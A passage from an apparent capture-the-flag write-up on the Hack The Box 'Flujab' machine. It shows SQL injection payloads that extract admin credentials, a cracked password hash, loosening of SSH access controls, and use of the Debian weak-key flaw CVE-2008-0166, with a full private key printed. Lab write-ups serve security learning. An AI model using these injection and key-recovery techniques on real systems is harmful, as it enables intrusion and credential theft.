<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:48:47 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:access</span><br><span class="line">Message-ID: &lt;f2306132c2238cf545023e952591045d@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; and column_name!&#x3D;&#39;id&#39; and column_name!&#x3D;&#39;loginname&#39; and column_name!&#x3D;&#39;namelc&#39; and column_name!&#x3D;&#39;email&#39;--                                           </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Fifth column : <code>access</code><br>I stopped right there to see if that’s enough, let’s see what data can we get from these columns.<br><img src="/images/hackthebox/flujab/75.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">CONCAT</span>(loginname,<span class="string">':'</span>,namelc,<span class="string">':'</span>,email,<span class="string">':'</span>,<span class="keyword">access</span>),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">FROM</span> <span class="keyword">admin</span><span class="comment">#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 16:01:53 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  </span><br><span class="line">Message-ID: &lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,CONCAT(loginname,&#39;:&#39;,namelc,&#39;:&#39;,email,&#39;:&#39;,access),4,5 FROM admin#                                          </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column <code>password</code> but anyway I just added password hoping that there’s a column called password, and I was right :<br><img src="/images/hackthebox/flujab/77.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">CONCAT</span>(loginname,<span class="string">':'</span>,namelc,<span class="string">':'</span>,<span class="keyword">password</span>,<span class="string">':'</span>,email,<span class="string">':'</span>,<span class="keyword">access</span>),<span class="number">4</span>,<span class="number">5</span> <span class="keyword">FROM</span> <span class="keyword">admin</span><span class="comment">#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 16:03:22 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb</span><br><span class="line">Message-ID: &lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,CONCAT(loginname,&#39;:&#39;,namelc,&#39;:&#39;,password,&#39;:&#39;,email,&#39;:&#39;,access),4,5 FROM admin#                             </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>let’s take a look at what we have :<br><img src="/images/hackthebox/flujab/79.png" alt=""><br>Password is a <code>sha256</code> hash. I used <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a> to crack it :<br><img src="/images/hackthebox/flujab/80.png" alt=""><br>Password : <code>th3doct0r</code><br>I added <code>sysadmin-console-01.flujab.htb</code> to <code>/etc/hosts</code> then I went to <code>http://sysadmin-console-01.flujab.htb/</code> :<br><img src="/images/hackthebox/flujab/81.png" alt=""><br><img src="/images/hackthebox/flujab/82.png" alt=""><br>I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :<br><img src="/images/hackthebox/flujab/83.png" alt=""><br><img src="/images/hackthebox/flujab/84.png" alt=""><br><code>Ajenti</code> administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)</p>
<h2 id="CVE-2008-0166-User-Flag"><a href="#CVE-2008-0166-User-Flag" class="headerlink" title="CVE-2008-0166, User Flag"></a>CVE-2008-0166, User Flag</h2><p>After getting in the first thing I noticed was the notepad :<br><img src="/images/hackthebox/flujab/85.png" alt=""><br><img src="/images/hackthebox/flujab/86.png" alt=""><br><img src="/images/hackthebox/flujab/87.png" alt=""><br>Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….<br><img src="/images/hackthebox/flujab/88.png" alt=""><br>For example :<br><img src="/images/hackthebox/flujab/89.png" alt=""><br><img src="/images/hackthebox/flujab/90.png" alt=""><br>But one user called <code>drno</code> had <code>.ssh</code> directory with a key in it.<br><img src="/images/hackthebox/flujab/91.png" alt=""><br><img src="/images/hackthebox/flujab/92.png" alt=""><br><img src="/images/hackthebox/flujab/93.png" alt=""><br><code>userkey</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B</span><br><span class="line"></span><br><span class="line">zPiYgS5&#x2F;LZqDZr4tFLHiOsym&#x2F;baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8</span><br><span class="line">w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5</span><br><span class="line">wMILkyVB4V2223X83ym3y&#x2F;4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq&#x2F;bJay</span><br><span class="line">v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd&#x2F;6iqBF6YE&#x2F;xKq</span><br><span class="line">OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy</span><br><span class="line">gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+&#x2F;E29FIv7verD2xOtcV93K1</span><br><span class="line">thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR&#x2F;M8i3fuXPp7BHHMGJWT</span><br><span class="line">jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf</span><br><span class="line">RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ&#x2F;3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT</span><br><span class="line">jSnjBlVNVKvICaLZ1ulfOMXN&#x2F;H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm&#x2F;</span><br><span class="line">S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K</span><br><span class="line">nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH</span><br><span class="line">M6Ud9IcBOsve1BsfhJepQtm&#x2F;4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT</span><br><span class="line">0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw</span><br><span class="line">4L8jU9ttEYAH&#x2F;VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o</span><br><span class="line">GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2</span><br><span class="line">hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR</span><br><span class="line">i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd</span><br><span class="line">hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a</span><br><span class="line">q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e</span><br><span class="line">h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM&#x2F;csl</span><br><span class="line">BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c&#x2F;p02cOoVWSUFr5a1Kxul</span><br><span class="line">9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p&#x2F;n3NkrKT6R+jI</span><br><span class="line">LSLiIuex63EKHhEdZISPsG9&#x2F;cMBSckZ&#x2F;oh86TQuZVagkXcQpIpNKEWwIv4yJIbji</span><br><span class="line">ISRFtN80+FMrhQf&#x2F;+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>Unfortunately it was encrypted so I used <code>ssh2john</code> then I cracked it :<br><img src="/images/hackthebox/flujab/94.png" alt=""><br><img src="/images/hackthebox/flujab/95.png" alt=""><br>Password : <code>shadowtroll</code><br><code>chmod 600 drno.key</code>, then I used the key to ssh as <code>drno</code> and we got the user flag :<br><img src="/images/hackthebox/flujab/96.png" alt=""><br>Nope we only got a connection reset. I went back to the administration panel and took a look at <code>/etc/hosts.allow</code> :<br><img src="/images/hackthebox/flujab/97.png" alt=""><br>I added my ip address and tried again :<br><img src="/images/hackthebox/flujab/98.png" alt=""><br><img src="/images/hackthebox/flujab/99.png" alt=""><br>Still a connection reset. I went back and added <code>sshd : ALL</code><br><img src="/images/hackthebox/flujab/100.png" alt=""><br><img src="/images/hackthebox/flujab/101.png" alt=""><br>It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in <code>authorized_keys</code> :<br><img src="/images/hackthebox/flujab/102.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># shell whitelisting + key auth enabled </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU&#x2F;di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5&#x2F;S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9&#x2F;v+k&#x2F;KkpDJndEkyV7ka&#x2F;r&#x2F;IQP4VoCMQnDpCUwRCNoRb&#x2F;kwqOMz8ViBEsg7odof7jjdOlbBz&#x2F;F9c&#x2F;s4nbS69v1xCh&#x2F;9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ&#x2F;yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ&#x2F;15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot&#x2F;Ma1k3izKDDTh2mVLehsivWBVI3a&#x2F;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&#x3D;</span><br></pre></td></tr></table></figure>
<p>I tried <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166" target="_blank" rel="noopener"><code>CVE-2008-0166</code></a>. I downloaded the files from <a href="https://github.com/g0tmi1k/debian-ssh" target="_blank" rel="noopener">here</a> then I extracted them in a directory called <code>cve-2008-0166</code>. Then I used <code>grep</code> to search for the last line in the public key :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE</span><br></pre></td></tr></table></figure>
<p>through all files :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -n &quot;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&quot; cve-2008-0166&#x2F;*</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/103.png" alt=""><br>It matched this public key : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian_ssh_rsa_4096_x86&#x2F;rsa&#x2F;4096&#x2F;dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub</span><br></pre></td></tr></table></figure>
<p>So I grabbed the private key : <code>dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> and used it to get ssh.<br><code>dead0b5b829ea2e3d22f47a7cbde17a6-23269</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJJgIBAAKCAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg</span><br><span class="line">2VNg0aAL+OZLD2YbU&#x2F;di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SH</span><br><span class="line">huioeEbGU+ul+QZAGlk1x5Ssv+kvJ5&#x2F;S9vUESXcD4z0jp21CxvKpCGI5K8YfcQyb</span><br><span class="line">F9&#x2F;v+k&#x2F;KkpDJndEkyV7ka&#x2F;r&#x2F;IQP4VoCMQnDpCUwRCNoRb&#x2F;kwqOMz8ViBEsg7odof</span><br><span class="line">7jjdOlbBz&#x2F;F9c&#x2F;s4nbS69v1xCh&#x2F;9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ&#x2F;</span><br><span class="line">yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ&#x2F;15kUyOvf</span><br><span class="line">058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6D</span><br><span class="line">jz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt0</span><br><span class="line">4zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUs</span><br><span class="line">YcR0Bot&#x2F;Ma1k3izKDDTh2mVLehsivWBVI3a&#x2F;Yv8C1UaI3lunRsh9rXFnOx1rtZ73</span><br><span class="line">uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxECASMC</span><br><span class="line">ggIAVwa7q84I1MO3knk2KlPfnQe+CAmzDy26ZX4d8zLbg&#x2F;YOmUzzoveuIqoUySX6</span><br><span class="line">t3ZXMn86N05aNbxAKfFG6Usgpew9O10CRp3pgklkLuuyFH0N7WX8joZIA1eZMnkw</span><br><span class="line">yTZqHC3hJNAeVBGF9x7+yCY8uBFSdN2dTsp6HSxW7l5mi4p2kek50cOf&#x2F;RMXuRdD</span><br><span class="line">HfaH8oiSuzCgd2EgoYPwXK8YwvPrgOUtigsgVts&#x2F;SOuwGEm4RJwQa+K66s2IPw57</span><br><span class="line">CHKSJThgJ0CDRwkjVvmGy0bVbtesppWjUFXc5K6X02VY92y0H4xBt8CuDuGaFiQh</span><br><span class="line">ocOpd7logTVMu2uMeSVOSZ5N1Qau3CjqZehrL5Ct0lPxUyBxbTylXn41pirZ2tmg</span><br><span class="line">6dJmG1JLtVq3dnhG90sX0T8clnY4CRcnfAaI9EqUSutRa+llYlHmljsiOyVql&#x2F;Qd</span><br><span class="line">nYPjzk1lDKBeaUkUHer76cllCHnbExZ7XClGWcp3OojCJKKOk7BHRlA5Vhhv479W</span><br><span class="line">qoVXVNKVMKFYhr74qf2ItxSIUiGKmg1JLglb7TC3FXt7zc3jCkjsPOrQMo7yj&#x2F;&#x2F;q</span><br><span class="line">CaxCgLWG3ydZ54s10f7rWQa5NZPuhU+MKHtwrcyA1zuke5uby0qr7G1ik1gzcE1C</span><br><span class="line">MdIcNV+Oaa4MV9XbtHbkfl&#x2F;Pnt9DukK36qur0gL5XHiRTCsCggEBANgvTal7nv8a</span><br><span class="line">ZoRqRPT46ciIUFGUNWj+9b+F6ATYbGAzfCHMHmQCBPjvZtZbJ&#x2F;fkEw&#x2F;HEE8HOvIj</span><br><span class="line">JCAboIfTDz23tgK+UcDbwCZd0dKhxsUxyTQUZcR3Q2kdegCJuXGb8U4SYsA1Uw8b</span><br><span class="line">7hLViXrKiKIZk8ShPUfHaKoYmQYCDq37Vf2xC2lyIXWHjJRJsYMMKCO2+ovjtHWq</span><br><span class="line">HD1BPWshA4ErBZxtQtARN3rYSXyVJhZO8jERRzYy0UID3OuOanzAv3LL6v1HmJNI</span><br><span class="line">847lI2lhJYkVC0K&#x2F;Ofd6lk3dLbjqkAA3kchC9iCMxBTUxRlR+DpV2RtYtjDsz+fs</span><br><span class="line">Mr1edYqPkf0CggEBAMhiDZRhFSlJcBQr0bFqk0palfm0u87hhVLjj5VN3tiFF8bI</span><br><span class="line">AhW8DZvcJcaxvGwiknoAsmq73coUDkKVdJEDXFsfdwVobrQrB0F4lTCnXdtnkdM&#x2F;</span><br><span class="line">FNuVgkj5qf1ZxzsMClvRsWek+wMrkZHpEDbmuNsSN25JDwE4AyYm94IURsKrAxCo</span><br><span class="line">rcKzx1bz&#x2F;A4Xm6DPsTewKmtXr9lwMEJASoFWnpEEdjPXUyvN+vqy0DD6bGP5ymn0</span><br><span class="line">&#x2F;bfp2Gbg5JNSb2zr19AgA4PpobvmyGTW54XUepBu1&#x2F;WxTuUTJXozNsdW5LplyzHw</span><br><span class="line">G1Fm0ThhnFIiD3l5WIQty6JeNHkW&#x2F;amlx9vpB6UCggEBAMvU1DIVeKdiCOM&#x2F;oBos</span><br><span class="line">hKchcEzq00W9MNkme6zMDmlVHURv&#x2F;2WbgQf3qhqQdiQ9cQ7gQpOnuzwSgSWWZChK</span><br><span class="line">p&#x2F;hcwY2O314RBaCEWB5eBI4KXp7RZ0Q17xn3OIQqFT87QpoRVcsq9oqWrUT1OHsW</span><br><span class="line">u1cCLD0NDeSXcU&#x2F;rTnNhBobIZwUjRUYpx8aVvw94rq7CUbtGH23z80pej6d4BrV2</span><br><span class="line">5gwSnuPx&#x2F;SqT49o5pF+FT8vkCOxvYGZNK7NFeIZTE&#x2F;H3j+&#x2F;k1j9DgTppWqtNEsJx</span><br><span class="line">icpkTHIiA3RPAr5xdECipQeE2ei0KeQs82QZEZuHzMlJoNCkGX6WIxx&#x2F;nY35+cvJ</span><br><span class="line">Md8CggEAM4btjI3+II86E9DA5Hp9pWfAKkRqzsxG2szNJmR7IbvS6fjql9&#x2F;mPgVo</span><br><span class="line">zLFcVlIIaIPWG3IjFrSzNbFnHfmMxvl2YHnwlLqbdzxDnsvzkDCTNlIMrX43cdnM</span><br><span class="line">oDuoQmIujKOipZ9zvvyTJYUSzEn1BSHw&#x2F;xoZzR0IH8DgjynJDXxugKBnMhD4vpaC</span><br><span class="line">pIm6TexDg1kverAl53SesfNGW8XRALgBI0X&#x2F;can+tX5wDJgqgBupE+6KYn310U&#x2F;F</span><br><span class="line">v3uY&#x2F;sBNcAg7axAw5yy3L999XO1+mishlvMUSYiUm8QGxYtfYyF9ZJzT0xpwUFOd</span><br><span class="line">ObD8qjUlY9FC&#x2F;d21uLzE4nsWIpsB9wKCAQAsMzr1RBSrK8XGh9a8KHcoyiELrYjS</span><br><span class="line">YmI+U9tMiYTjMAVCSPOY6tc24Kg4fFrCVczAzAH78EsR7w3HWeZek6QsD4ofPp9r</span><br><span class="line">MNPjpGPxK9hpRzf7SCSOB1Bt7nqO0Rva0gehgGOm5iHw0M70IT&#x2F;Q2VcyRAa9IC9V</span><br><span class="line">+fz7m8UVsH7i9QU69mfOZA4xe6P+FxJsMpEIvSG8XYRQlSQOjVpHtH&#x2F;Q++XXGg1H</span><br><span class="line">YmV&#x2F;Y0t4jAp2NsVstNSEPx77r9FxC6ItXiX2lamTtZiGZvREN3vrSujKwpBhKYlc</span><br><span class="line">uUZN5cXjMY84Yz0Rau5+oaio9ldLJUGB1&#x2F;DUYlvosjazQUjKYBK&#x2F;eV3n</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/104.png" alt=""><br>We owned user !</p>
